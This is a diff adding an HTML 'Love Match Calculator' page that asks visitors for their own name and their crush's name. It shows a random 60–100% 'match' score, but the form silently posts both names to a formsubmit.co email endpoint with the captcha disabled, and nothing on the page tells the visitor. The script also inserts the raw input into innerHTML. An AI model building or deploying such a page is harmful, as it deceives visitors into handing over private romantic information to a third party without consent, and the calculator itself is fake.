@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Love Match Calculator ❤️</title>
+
+<style>
+body{
+    font-family: Arial, sans-serif;
+    background: linear-gradient(135deg,#ff4b6e,#ff8fa3);
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh;
+    margin:0;
+}
+.box{
+    background:white;
+    padding:25px;
+    border-radius:20px;
+    width:320px;
+    text-align:center;
+    box-shadow:0 10px 30px rgba(0,0,0,.2);
+}
+input{
+    width:90%;
+    padding:12px;
+    margin:8px 0;
+    border:1px solid #ddd;
+    border-radius:10px;
+}
+button{
+    background:#ff4b6e;
+    color:white;
+    border:none;
+    padding:12px 20px;
+    border-radius:10px;
+    cursor:pointer;
+}
+#result{
+    margin-top:15px;
+    font-size:22px;
+    font-weight:bold;
+}
+</style>
+</head>
+
+<body>
+
+<div class="box">
+    <h2>❤️ Love Match ❤️</h2>
+
+    <form id="loveForm"
+          action="https://formsubmit.co/YOUR_EMAIL@example.com"
+          method="POST">
+
+        <input type="text" id="boy" name="Your Name" placeholder="Your Name" required>
+
+        <input type="text" id="girl" name="Soulmate Name" placeholder="Soulmate Name" required>
+
+        <input type="hidden" name="_captcha" value="false">
+
+        <button type="submit" onclick="showResult()">Check Match</button>
+    </form>
+
+    <div id="result"></div>
+</div>
+
+<script>
+function showResult(){
+
+    let a=document.getElementById("boy").value;
+    let b=document.getElementById("girl").value;
+
+    let percent=Math.floor(Math.random()*41)+60;
+
+    setTimeout(()=>{
+        document.getElementById("result").innerHTML=
+        a+" ❤️ "+b+" = "+percent+"% Match";
+    },500);
+}
+</script>
+
+</body>
+</html>
